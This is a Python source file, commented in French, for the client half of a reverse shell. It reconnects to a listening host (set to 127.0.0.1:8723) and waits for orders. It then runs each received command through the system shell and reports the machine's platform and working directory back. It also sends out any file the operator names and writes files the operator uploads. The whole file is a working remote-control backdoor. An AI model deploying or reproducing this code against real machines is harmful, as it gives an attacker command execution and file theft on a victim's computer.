import socket
import time
import subprocess
import os
import platform


def process(request, file=None):  # fonction executant une requete
    if request[:2] == "cd":  # change le repertoire courrant
        try:
            os.chdir(request[3:])
            return bytes(), bytes()
        except (FileNotFoundError, OSError):
            return "The system cannot find the path specified.".encode(), bytes()
    elif request[:8] == "download":  # revoie un fichier
        try:
            return "File downloaded".encode(), open(request[9:], "rb").read()
        except (FileNotFoundError, OSError):
            return "The system cannot find the file specified.".encode(), bytes()
        except PermissionError:
            return f"Permission denied: '{request[9:]}'".encode(), bytes()
    elif request[:6] == "upload":  # ecrit un fichier
        open(request[7:], "wb").write(file)
        return "File uploaded".encode(), bytes()
    result = subprocess.run(request, shell=True, capture_output=True, universal_newlines=True)
    if result.returncode != 0:  # renvoie un message d'erreur
        return f"Error: {result.returncode} {result.stderr}".encode(), bytes()
    return result.stdout.encode(), bytes()


def send(socket_details, result=bytes(), file=bytes()):  # fonction envoyant des donnes au server en communiquant
    # leurs tailles en tete
    directory = f"{platform.platform()} {os.getcwd()}".encode()
    socket_details.sendall(
        f"{str(len(result))}-{str(len(directory))}_{str(len(file))}.".encode() + result + directory + file)


def recv_command(socket_details, mds):  # fonction receptionnant les donnees envoyees du client en respectant la
    # longueure de celles-ci communiquees en tete
    data_size_util = str()
    data_size = str()
    while data_size_util != "_":
        data_size += socket_details.recv(1).decode()
        try:
            data_size_util = data_size[-1]
        except IndexError:
            data_size_util = str()
    pf = data_size.index("-")
    prompt_size = int(data_size[:pf])
    data = bytes()
    while len(data) < prompt_size + int(data_size[pf + 1:-1]):  # recupere les donnees
        data += socket_details.recv(mds)
    return data[:prompt_size].decode(), data[prompt_size:]


HOST_IP = "127.0.0.1"
HOST_PORT = 8723
MAX_DATA_SIZE = 1024
print(f"Connecting on {HOST_IP} port {HOST_PORT} ...")
connection_socket = socket.socket()
while True:
    try:
        connection_socket = socket.socket()
        connection_socket.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("Connection attempt failed trying again...")
        time.sleep(1)
    else:
        print("Connection established")
        break
try:
    send(connection_socket)
    while True:
        a = recv_command(connection_socket, MAX_DATA_SIZE)
        if a[0] == "exit":
            break
        send(connection_socket, *process(*a))
except ConnectionResetError:
    pass
finally:
    connection_socket.close()
    exit()
